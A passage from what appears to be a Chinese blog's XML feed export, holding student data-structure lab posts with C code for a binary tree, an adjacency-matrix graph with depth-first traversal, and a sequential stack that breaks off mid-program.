        printf<span class="token punctuation">(</span><span class="token string">"该树的最大深度为%d<span class="token entity" title="\n">\n</span>"</span>,h<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>break<span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">6</span>:
        fflush<span class="token punctuation">(</span>stdin<span class="token punctuation">)</span><span class="token punctuation">;</span>
        printf<span class="token punctuation">(</span><span class="token string">"按先序次序输入二叉树结点的值（一个字符）#表示空树<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        CreateBiTree<span class="token punctuation">(</span>T<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token builtin class-name">break</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构图</title>
    <url>/2021/07/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%9B%BE/</url>
    <content><![CDATA[<p>实验项目名称：图的操作的实现<br>实验目的与要求:<br>1.基础知识:掌握数据结构中图的相关知识;掌握C或VC+ +语言中程序设计的方法.<br>2.参考教材相关算法，完成以下程序功能:<br>(1)利用邻接矩阵完成建图(能力好的同学可以选用邻接表结构建图) ;<br>(2)利用广度优先搜索或深度优先搜索遍历算法编写对已建图的遍历工作;<br>(3)打印输出图的顶点表和邻接矩阵(若选作邻接表，则打印邻接表的相应元素值)<br>(4)实验性质:验证性(4学时)<br>说明:程序包含的主要函数:主函数、建图、搜索遍历、打印图、操作菜单函数和以上函数中的嵌套子函数，以及主函数，另外添加相关注释。<br>注意:在主函数调用子函数流程中体现先建图后遍历和其它操作的条件控制，即在调用除建图算法以外的其它所有算法前，先判断图是否已经建立，若没建图，只能先建图，不能做其它操作。由于实验中图采用邻接矩阵结构，该结构在参考代码中被设计成静态二维数组，因此可以考虑使用状态开关变量flag的方式来判断建图是否完成，即没建图前flag=0,建图后就置flag=1,在其它运算前判断flag==1时才可以操作。<br>图源代码：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#include&lt;stdio.h></span>
<span class="token comment">#include&lt;limits.h></span>
<span class="token comment">#include&lt;windows.h></span>
<span class="token comment">#define INFINITY INT_MAX</span>
<span class="token comment">#define MAX_VERTEX_NUM 20</span>
<span class="token comment">#define OK 1</span>
typedef int Status<span class="token punctuation">;</span>
typedef enum<span class="token punctuation">&#123;</span>DG,DN,UDG,UDN<span class="token punctuation">&#125;</span>GraphKind<span class="token punctuation">;</span>
typedef int VRType<span class="token punctuation">;</span>
typedef char VertexType<span class="token punctuation">;</span>
typedef char* InfoType<span class="token punctuation">;</span>
typedef struct ArcCell
<span class="token punctuation">&#123;</span>
    VRType    adj<span class="token punctuation">;</span>//顶点间关系，无权图取1或0<span class="token punctuation">;</span>有权图取权值类型
    InfoType *info<span class="token punctuation">;</span>//该弧相关信息的指针
<span class="token punctuation">&#125;</span>ArcCell,AdjMatrix<span class="token punctuation">[</span>MAX_VERTEX_NUM<span class="token punctuation">]</span><span class="token punctuation">[</span>MAX_VERTEX_NUM<span class="token punctuation">]</span><span class="token punctuation">;</span>
typedef struct
<span class="token punctuation">&#123;</span>
    VertexType vexs<span class="token punctuation">[</span>MAX_VERTEX_NUM<span class="token punctuation">]</span><span class="token punctuation">;</span>//顶点表，用一维向量即可（n）
    AdjMatrix  arcs<span class="token punctuation">;</span> //邻接矩阵n*n
    int vexnum,arcnum<span class="token punctuation">;</span>//顶点总数n，弧<span class="token punctuation">(</span>边<span class="token punctuation">)</span>总数e
    GraphKind kind<span class="token punctuation">;</span>//图的种类标志
<span class="token punctuation">&#125;</span>MGraph<span class="token punctuation">;</span>
boolean visited<span class="token punctuation">[</span>MAX_VERTEX_NUM<span class="token punctuation">]</span><span class="token punctuation">;</span>
Status<span class="token punctuation">(</span>*VisitFunc<span class="token punctuation">)</span><span class="token punctuation">(</span>MGraph G,int <span class="token function">v</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Status LocateVex<span class="token punctuation">(</span>MGraph G,char <span class="token function">v</span><span class="token punctuation">)</span>//定位操作：对顶点v定位，返回该顶点在数组的下标，若找不到返回-1
<span class="token punctuation">&#123;</span>
    for<span class="token punctuation">(</span>int <span class="token assign-left variable">i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>G.vexnum<span class="token punctuation">;</span>i++<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        if<span class="token punctuation">(</span>v<span class="token operator">==</span>G.vexs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token builtin class-name">return</span> i<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token builtin class-name">return</span> -1<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

Status CreateUDN<span class="token punctuation">(</span>MGraph <span class="token operator">&amp;</span>G<span class="token punctuation">)</span>//采用数组<span class="token punctuation">(</span>邻接矩阵<span class="token punctuation">)</span>表示法，构造无向网。
<span class="token punctuation">&#123;</span>
    G.kind<span class="token operator">=</span>UDN<span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"输入顶点个数和边数(以“,”作分界)：<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    scanf<span class="token punctuation">(</span><span class="token string">"%d,%d"</span>,<span class="token operator">&amp;</span>G.vexnum,<span class="token operator">&amp;</span>G.arcnum<span class="token punctuation">)</span><span class="token punctuation">;</span>//输入顶点个数和边数
    while<span class="token punctuation">(</span>G.vexnum<span class="token operator">></span>MAX_VERTEX_NUM<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        printf<span class="token punctuation">(</span><span class="token string">"最大顶点数为7，请重新输入"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        scanf<span class="token punctuation">(</span><span class="token string">"%d,%d"</span>,<span class="token operator">&amp;</span>G.vexnum,<span class="token operator">&amp;</span>G.arcnum<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
        printf<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\n">\n</span>请依次输入向量值<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        for<span class="token punctuation">(</span>int <span class="token assign-left variable">i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>G.vexnum<span class="token punctuation">;</span>i++<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        fflush<span class="token punctuation">(</span>stdin<span class="token punctuation">)</span><span class="token punctuation">;</span>
        printf<span class="token punctuation">(</span><span class="token string">"第%d个:"</span>,i+1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        scanf<span class="token punctuation">(</span><span class="token string">"%c"</span>,<span class="token operator">&amp;</span>G.vexs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    for<span class="token punctuation">(</span>int <span class="token assign-left variable">i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>G.vexnum<span class="token punctuation">;</span>i++<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>//初始化邻接矩阵
        for<span class="token punctuation">(</span>int <span class="token assign-left variable">j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>G.vexnum<span class="token punctuation">;</span>j++<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            G.arcs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>.adj<span class="token operator">=</span>INFINITY<span class="token punctuation">;</span>
            G.arcs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>.info<span class="token operator">=</span>NULL<span class="token punctuation">;</span>//该弧相关信息的指针，可在实验中删除？
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    char front,rear<span class="token punctuation">;</span>
    int values<span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\n">\n</span>输入一条边依附的两个顶点及权值(以“,”作分界)<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    for<span class="token punctuation">(</span>int <span class="token assign-left variable">i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>G.arcnum<span class="token punctuation">;</span>i++<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        printf<span class="token punctuation">(</span><span class="token string">"第%d条："</span>,i+1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        fflush<span class="token punctuation">(</span>stdin<span class="token punctuation">)</span><span class="token punctuation">;</span>
        scanf<span class="token punctuation">(</span><span class="token string">"%c,%c,%d"</span>,<span class="token operator">&amp;</span>rear,<span class="token operator">&amp;</span>front,<span class="token operator">&amp;</span>values<span class="token punctuation">)</span><span class="token punctuation">;</span>
        int m,n<span class="token punctuation">;</span>
        <span class="token assign-left variable">m</span><span class="token operator">=</span> LocateVex <span class="token punctuation">(</span>G,rear<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token assign-left variable">n</span><span class="token operator">=</span> LocateVex <span class="token punctuation">(</span>G,front<span class="token punctuation">)</span><span class="token punctuation">;</span>
        if<span class="token punctuation">(</span>m<span class="token operator">==</span>-1<span class="token operator">||</span><span class="token assign-left variable">n</span><span class="token operator">==</span>-1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            printf<span class="token punctuation">(</span><span class="token string">"输入顶点或不在此图中，请重新输入<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            i--<span class="token punctuation">;</span>
            <span class="token builtin class-name">continue</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        G.arcs<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span>.adj<span class="token operator">=</span>values<span class="token punctuation">;</span>
        G.arcs<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span>m<span class="token punctuation">]</span>.adj<span class="token operator">=</span>values<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token builtin class-name">return</span> OK<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

Status printArcs<span class="token punctuation">(</span>MGraph G<span class="token punctuation">)</span>//打印图
<span class="token punctuation">&#123;</span>
    int i<span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    for<span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>G.vexnum<span class="token punctuation">;</span>i++<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        printf<span class="token punctuation">(</span><span class="token string">" %c"</span>,G.vexs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    for<span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>G.vexnum<span class="token punctuation">;</span>i++<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        printf<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\n">\n</span>%c"</span>,G.vexs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        for<span class="token punctuation">(</span>int <span class="token assign-left variable">j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>G.vexnum<span class="token punctuation">;</span>j++<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            if<span class="token punctuation">(</span>G.arcs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>.adj<span class="token operator">==</span>INFINITY<span class="token punctuation">)</span>
            printf<span class="token punctuation">(</span><span class="token string">" #"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span>
            printf<span class="token punctuation">(</span><span class="token string">" %d"</span>,G.arcs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>.adj<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    printf<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token builtin class-name">return</span> OK<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

Status FirstAdjVex<span class="token punctuation">(</span>MGraph G,int <span class="token function">v</span><span class="token punctuation">)</span>//查找与顶点v的第一个邻接点，找到后立刻返回下标，
<span class="token punctuation">&#123;</span>
    for<span class="token punctuation">(</span>int <span class="token assign-left variable">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>G.vexnum<span class="token punctuation">;</span>i++<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        if<span class="token punctuation">(</span>G.arcs<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span>.adj<span class="token operator">!=</span>INFINITY<span class="token punctuation">)</span>
        <span class="token builtin class-name">return</span> i<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token builtin class-name">return</span> -1<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

Status NextAdjVex<span class="token punctuation">(</span>MGraph G,int v,int w<span class="token punctuation">)</span>//查找与顶点v的w邻接点的下一个邻接点，找到后立刻返回下标，
<span class="token punctuation">&#123;</span>
    for<span class="token punctuation">(</span>int <span class="token assign-left variable">i</span><span class="token operator">=</span>w+1<span class="token punctuation">;</span>i<span class="token operator">&lt;</span>G.vexnum<span class="token punctuation">;</span>i++<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        if<span class="token punctuation">(</span>G.arcs<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span>.adj<span class="token operator">!=</span>INFINITY<span class="token punctuation">)</span>
        <span class="token builtin class-name">return</span> i<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token builtin class-name">return</span> -1<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

Status DFS<span class="token punctuation">(</span>MGraph G,int <span class="token function">v</span><span class="token punctuation">)</span>//从第v个顶点出发递归深度优先遍历图G
<span class="token punctuation">&#123;</span>
    visited<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token operator">=</span>TRUE<span class="token punctuation">;</span>
    VisitFunc<span class="token punctuation">(</span>G,v<span class="token punctuation">)</span><span class="token punctuation">;</span>
    for<span class="token punctuation">(</span>int <span class="token assign-left variable">w</span><span class="token operator">=</span>FirstAdjVex<span class="token punctuation">(</span>G,v<span class="token punctuation">)</span><span class="token punctuation">;</span>w<span class="token operator">></span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token assign-left variable">w</span><span class="token operator">=</span>NextAdjVex<span class="token punctuation">(</span>G,v,w<span class="token punctuation">))</span>
    <span class="token punctuation">&#123;</span>
        if<span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">[</span>w<span class="token punctuation">]</span><span class="token punctuation">)</span>
        DFS<span class="token punctuation">(</span>G,w<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token builtin class-name">return</span> OK<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

Status DFSTraverse<span class="token punctuation">(</span>MGraph G,Status<span class="token punctuation">(</span>*Visit<span class="token punctuation">)</span><span class="token punctuation">(</span>MGraph G,int <span class="token function">v</span><span class="token punctuation">))</span>//深度优先遍历
<span class="token punctuation">&#123;</span>
    VisitFunc <span class="token operator">=</span> Visit<span class="token punctuation">;</span>
    int <span class="token function">v</span><span class="token punctuation">;</span>
    for<span class="token punctuation">(</span>v<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>v<span class="token operator">&lt;</span>G.vexnum<span class="token punctuation">;</span>v++<span class="token punctuation">)</span>
    visited<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token operator">=</span>false<span class="token punctuation">;</span>
    for<span class="token punctuation">(</span>v<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>v<span class="token operator">&lt;</span>G.vexnum<span class="token punctuation">;</span>v++<span class="token punctuation">)</span>
    if<span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span>
    DFS<span class="token punctuation">(</span>G,v<span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token builtin class-name">return</span> OK<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

Status printAdjVex<span class="token punctuation">(</span>MGraph G,int <span class="token function">v</span><span class="token punctuation">)</span>//访问顶点v输出
<span class="token punctuation">&#123;</span>
    printf<span class="token punctuation">(</span><span class="token string">"%c "</span>,G.vexs<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token builtin class-name">return</span> OK<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

Status DestroyGraph<span class="token punctuation">(</span>MGraph <span class="token operator">&amp;</span>G<span class="token punctuation">)</span>//销毁图
<span class="token punctuation">&#123;</span>
    G.vexnum<span class="token operator">=</span>NULL<span class="token punctuation">;</span>
    G.arcnum<span class="token operator">=</span>NULL<span class="token punctuation">;</span>
    <span class="token builtin class-name">return</span> OK<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

Status OperateMenu<span class="token punctuation">(</span>int num<span class="token punctuation">)</span>//菜单函数
<span class="token punctuation">&#123;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------****操作菜单****------<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	printf<span class="token punctuation">(</span><span class="token string">"------    0 退出系统<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------    1 建图<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------    2 打印图<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------    3 深度遍历<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------    4 销毁图<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------    请选择你所需要的操作<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    scanf<span class="token punctuation">(</span><span class="token string">"%d"</span>,<span class="token operator">&amp;</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token builtin class-name">return</span> num<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token function-name function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    MGraph G<span class="token punctuation">;</span>
    int <span class="token assign-left variable">flag</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    int <span class="token assign-left variable">num</span><span class="token operator">=</span>-1<span class="token punctuation">;</span>  
    while<span class="token punctuation">(</span>num<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token punctuation">&#123;</span>
       <span class="token assign-left variable">num</span><span class="token operator">=</span>OperateMenu<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    switch<span class="token punctuation">(</span>num<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">case</span> <span class="token number">1</span>:
        <span class="token assign-left variable">flag</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
        CreateUDN<span class="token punctuation">(</span>G<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token builtin class-name">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">2</span>:
        if<span class="token punctuation">(</span>flag<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>printf<span class="token punctuation">(</span><span class="token string">"图不存在<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token builtin class-name">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span>
        printArcs<span class="token punctuation">(</span>G<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token builtin class-name">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">3</span>:
        if<span class="token punctuation">(</span>flag<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>printf<span class="token punctuation">(</span><span class="token string">"图不存在<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token builtin class-name">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span>
        DFSTraverse<span class="token punctuation">(</span>G,printAdjVex<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token builtin class-name">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">4</span>:
        if<span class="token punctuation">(</span>flag<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>printf<span class="token punctuation">(</span><span class="token string">"图不存在<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token builtin class-name">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span>
        <span class="token punctuation">&#123;</span>DestroyGraph<span class="token punctuation">(</span>G<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token assign-left variable">flag</span><span class="token operator">=</span><span class="token number">0</span>；
        printf<span class="token punctuation">(</span><span class="token string">"已销毁图<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>break<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构栈</title>
    <url>/2021/07/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%A0%88/</url>
    <content><![CDATA[<pre><code class="bash">实验项目名称：栈与队列操作的实现
实验目的与要求：
1.基础知识:掌握数据结构中栈和队列的相关知识;掌握C或VC++语言中程序设计的方法.
2.程序功能:
(1)参考教材相关算法，采用顺序存储存储实现栈的建立与初始化、入栈、出栈、判断栈空等操作;
(2)参考教材相关算法，采用顺序存储或链式存储实现队列的建立与初始化、销毁队列、入队列、出队列、判断队列为空等操作;
●实验性质:验证性(4学时，其中栈2学时，队列2学时)
说明：●说明:每种存储结构下算法实现均包含的主要函数有:主函数、操作界面、建栈(队列)、入栈(入队列)、出栈(出队列) ,应有相关注释。
注意：
(1) 主函数调用子函数的逻辑顺序一主函数调用建栈(建队列)子函数应在调用入/出栈(队列)等子函数之前，这须在主函数中进行条件控制。
(2)2.在选定存储结构后，需要特别关注“栈不存在”和“空栈”、“队列不存在”和“空队列”的语句表达方式以及它们的使用时机和方式。
顺序式栈
源代码：
#include&lt;stdio.h&gt;
#include&lt;malloc.h&gt;
#define OVERFLOW  0
#define OK 1
#define ERROR 0
#define STACK_INIT_SIZE 100
#define STACKINCREMENT 10
typedef int Status;
typedef int SElemType;
typedef struct
&#123;
    SElemType *base;
    SElemType *top;
    int stacksize;
&#125;SqStack;

Status InitStack(SqStack &amp;S)//构造一个空栈
&#123;
    S.base=(SElemType*)malloc(STACK_INIT_SIZE*sizeof(SElemType));
    if(!S.base)return(OVERFLOW);
    S.top=S.base;
    S.stacksize=STACK_INIT_SIZE;
    return OK;
&#125;

Status Push(SqStack &amp;S, SElemType e)//插入元素e为新的栈顶元素
&#123;
    if(S.top - S.base &gt;= S.stacksize)   
    &#123;
    S.base=(SElemType*)realloc(S.base,(S.stacksize+STACKINCREMENT)*sizeof(SElemType));
    if(!S.base)return(OVERFLOW);
    S.top=S.base + S.stacksize;
    S.stacksize += STACKINCREMENT;
    &#125;
    *S.top++=e;
    return OK;
&#125;

Status Pop(SqStack &amp;S,SElemType &amp;e)//若栈不为空，则删除栈顶元素，用e返回其值
&#123;
    if(S.top == S.base)
    return ERROR;
    e=*--S.top;
    return OK;
&#125;

Status StackEmpty(SqStack S)//判断是否为空栈
&#123;
    if(S.top==S.base)
    return OK;
    else
    return ERROR;
&#125;

Status PrintStack(SqStack S)//输出栈
&#123;
    int*p;
    p=S.base;
    while(p!=S.top)
    &#123;
        printf(&quot;%d &quot;,*p);
        p++;
    &#125;
    return 0;
&#125;

Status GetTop(SqStack S,SElemType &amp;e)//输出栈顶元素
&#123;
    if(S.top == S.base)
    return ERROR;
    e = *(S.top-1);
    return OK;
&#125;

Status OperateMenu(int num)
&#123;
    printf(&quot;------****操作菜单****------\n\n&quot;);
    printf(&quot;------    0 退出系统\n&quot;);
    printf(&quot;------    1 插入一个元素\n&quot;);
    printf(&quot;------    2 删除栈顶元素\n&quot;);
    printf(&quot;------    3 判断是否为空栈\n&quot;);
    printf(&quot;------    4 输出栈中全部元素\n&quot;);
    printf(&quot;------    5 返回栈顶元素\n&quot;);
    printf(&quot;------    请选择你所需要的操作\n&quot;);
    scanf(&quot;%d&quot;,&amp;num);
    return num;
&#125;

int main()
&#123;
    SqStack S;
    SElemType e;
    int num=-1;
    if(InitStack(S))
